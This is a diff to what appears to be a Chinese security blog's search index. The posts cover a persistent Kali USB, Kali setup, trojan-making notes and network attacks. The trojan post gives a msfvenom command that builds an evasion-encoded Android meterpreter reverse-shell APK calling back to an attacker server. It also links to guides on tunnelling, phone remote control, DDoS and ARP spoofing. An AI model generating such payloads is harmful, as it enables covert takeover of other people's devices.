@@ -100,8 +100,18 @@
   <entry>
     <title>制作U盘可携带式Kali</title>
     <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%88%B6%E4%BD%9CU%E7%9B%98%E5%8F%AF%E6%90%BA%E5%B8%A6%E5%BC%8FKali/</url>
-    <content><![CDATA[<h1 id="制作U盘可携带式Kali"><a href="#制作U盘可携带式Kali" class="headerlink" title="制作U盘可携带式Kali"></a>制作U盘可携带式Kali</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p><img src="https://s2.loli.net/2023/11/07/faCTRNw8G7iXmlq.png" alt="image-20231107145917896"></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://zhuanlan.zhihu.com/p/129348579">https://zhuanlan.zhihu.com/p/129348579</a>	“将Kali Linux部署在U盘上，并实现U盘启动（汇总纠错）”<br>[2]: <a href="https://blog.csdn.net/qq_59032809/article/details/127189546">https://blog.csdn.net/qq_59032809/article/details/127189546</a>	“如何将kali系统写入U盘，并在U盘中启动”<br>[3]: <a href="https://blog.csdn.net/BlackBtuWhite/article/details/129645845">https://blog.csdn.net/BlackBtuWhite/article/details/129645845</a>	“制作U盘可携带式KaliLinux”</p>
+    <content><![CDATA[<h1 id="制作U盘可携带式Kali"><a href="#制作U盘可携带式Kali" class="headerlink" title="制作U盘可携带式Kali"></a>制作U盘可携带式Kali</h1><h2 id="1-准备材料"><a href="#1-准备材料" class="headerlink" title="1.准备材料"></a>1.准备材料</h2><h3 id="1-1-硬件"><a href="#1-1-硬件" class="headerlink" title="1.1 硬件"></a>1.1 硬件</h3><p>1.32GB以上，USB 3.0及以上U盘一块；<br>2.电脑一台；</p>
+<h3 id="1-2-软件"><a href="#1-2-软件" class="headerlink" title="1.2 软件"></a>1.2 软件</h3><p>1.<a href="https://www.balena.io/etcher/">balenaEtcher</a><br>2.<a href="https://www.disktool.cn/">分区助手</a><br>3.VMWare Workstation（已安装Kali，用于配置持久化分区）<br>4.<a href="https://www.kali.org/get-kali/#kali-live">Kali USB版镜像</a></p>
+<h2 id="烧录"><a href="#烧录" class="headerlink" title="烧录"></a>烧录</h2><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 -L persistence /dev/sdb5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /mnt/usb</span><br><span class="line">mount /dev/sdb5 /mnt/usb</span><br><span class="line">echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</span><br><span class="line">umount /mnt/usb</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p><img src="https://s2.loli.net/2023/11/07/faCTRNw8G7iXmlq.png" alt="image-20231107145917896"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://zhuanlan.zhihu.com/p/129348579">https://zhuanlan.zhihu.com/p/129348579</a>	“将Kali Linux部署在U盘上，并实现U盘启动（汇总纠错）”<br>[2]: <a href="https://blog.csdn.net/qq_59032809/article/details/127189546">https://blog.csdn.net/qq_59032809/article/details/127189546</a>	“如何将kali系统写入U盘，并在U盘中启动”<br>[3]: <a href="https://blog.csdn.net/BlackBtuWhite/article/details/129645845">https://blog.csdn.net/BlackBtuWhite/article/details/129645845</a>	“制作U盘可携带式KaliLinux”<br>[4]: <a href="https://blog.csdn.net/qq_25426559/article/details/130190594">https://blog.csdn.net/qq_25426559/article/details/130190594</a>	“【KALI】自制U盘版KALI（即插即用具有可持久化功能）”</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
@@ -112,8 +122,43 @@
       </tags>
   </entry>
   <entry>
+    <title>木马病毒制作的笔记</title>
+    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a href="https://hsk.oray.com/">花生壳</a></p>
+<p><a href="https://www.ngrok.cc/user.html">ngork</a></p>
+<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="目标机器中毒后的操作"><a href="#目标机器中毒后的操作" class="headerlink" title="目标机器中毒后的操作"></a>目标机器中毒后的操作</h2><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
+<p>[4]: <a href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>木马病毒</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过kali进行网络攻击</title>
+    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E9%80%9A%E8%BF%87kali%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="通过kali进行网络攻击"><a href="#通过kali进行网络攻击" class="headerlink" title="通过kali进行网络攻击"></a>通过kali进行网络攻击</h1><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019">https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019</a>	“Kali Linux三种网络攻击方法总结（DDoS、CC和ARP欺骗）”<br>[2]: <a href="https://zhuanlan.zhihu.com/p/441180960">https://zhuanlan.zhihu.com/p/441180960</a>	“我在实验室电脑上玩Kali（中间人攻击、ARP，顺便断了同学的网）”<br>[3]: </p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>网络攻击</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kali的配置</title>
-    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/kali%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
+    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/kali%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<h1 id="kali的配置"><a href="#kali的配置" class="headerlink" title="kali的配置"></a>kali的配置</h1><h2 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
 
 
@@ -163,49 +208,16 @@
 <p>重启后可以看到右上角多了一个小键盘的图标，点击后选择“配置”。</p>
 <p>在弹出的页面内可以看到多出了“Google拼音”汉语输入法。</p>
 <p>如果没有，则只需要点击左下角的“+”，然后搜索“google”，然后添加即可。</p>
+<h2 id="配置vpn"><a href="#配置vpn" class="headerlink" title="配置vpn"></a>配置vpn</h2><p><a href="https://blog.iswiftai.com/posts/clash-linux/">在 Linux 中使用 Clash</a></p>
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/weixin_44971640/article/details/127387950">https://blog.csdn.net/weixin_44971640/article/details/127387950</a>	“Kali Linux基础配置 超详细图解”</p>
 <p>[2]: <a href="https://blog.csdn.net/weixin_62808713/article/details/130373096">https://blog.csdn.net/weixin_62808713/article/details/130373096</a>	“Kali 安装中文输入法（超详细）”</p>
+<p>[3]: <a href="https://blog.iswiftai.com/posts/clash-linux/">https://blog.iswiftai.com/posts/clash-linux/</a>	“在 Linux 中使用 Clash”</p>
 ]]></content>
       <categories>
         <category>信息安全</category>
       </categories>
       <tags>
         <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>木马病毒制作的笔记</title>
-    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC%E7%97%85%E6%AF%92%E5%88%B6%E4%BD%9C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="木马病毒制作的笔记"><a href="#木马病毒制作的笔记" class="headerlink" title="木马病毒制作的笔记"></a>木马病毒制作的笔记</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a href="https://hsk.oray.com/">花生壳</a></p>
-<p><a href="https://www.ngrok.cc/user.html">ngork</a></p>
-<h2 id="木马病毒的制作"><a href="#木马病毒的制作" class="headerlink" title="木马病毒的制作"></a>木马病毒的制作</h2><h3 id="windows病毒"><a href="#windows病毒" class="headerlink" title="windows病毒"></a>windows病毒</h3><h3 id="安卓病毒"><a href="#安卓病毒" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="病毒免杀"><a href="#病毒免杀" class="headerlink" title="病毒免杀"></a>病毒免杀</h2><h3 id="安卓病毒-1"><a href="#安卓病毒-1" class="headerlink" title="安卓病毒"></a>安卓病毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom --platform Android -p android/meterpreter/reverse_tcp LHOST=服务器地址（域名） LPORT=隧道端口 -e x86/shikata_ga_nai R &gt; black_1.apk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="目标机器中毒后的操作"><a href="#目标机器中毒后的操作" class="headerlink" title="目标机器中毒后的操作"></a>目标机器中毒后的操作</h2><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/NuclearDalance/article/details/116450238">https://blog.csdn.net/NuclearDalance/article/details/116450238</a>	“使用Kali Linux系统生成木马病毒并实现远程控制计算机”<br>[2]: <a href="https://xz.aliyun.com/t/12893">https://xz.aliyun.com/t/12893</a>	“Android免杀小结”<br>[3]: <a href="https://cloud.tencent.com/developer/article/2245833">https://cloud.tencent.com/developer/article/2245833</a>	“使用Kali生成木马入侵安卓手机”</p>
-<p>[4]: <a href="https://bbs.kanxue.com/thread-254995.htm">https://bbs.kanxue.com/thread-254995.htm</a>	“[分享]免杀之安卓渗透”</p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>木马病毒</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通过kali进行网络攻击</title>
-    <url>/2023/11/07/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E9%80%9A%E8%BF%87kali%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="通过kali进行网络攻击"><a href="#通过kali进行网络攻击" class="headerlink" title="通过kali进行网络攻击"></a>通过kali进行网络攻击</h1><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1]: <a href="https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019">https://blog.csdn.net/a_n_d_y_s_u_n__/article/details/118528019</a>	“Kali Linux三种网络攻击方法总结（DDoS、CC和ARP欺骗）”<br>[2]: <a href="https://zhuanlan.zhihu.com/p/441180960">https://zhuanlan.zhihu.com/p/441180960</a>	“我在实验室电脑上玩Kali（中间人攻击、ARP，顺便断了同学的网）”<br>[3]: </p>
-]]></content>
-      <categories>
-        <category>信息安全</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>网络攻击</tag>
       </tags>
   </entry>
   <entry>
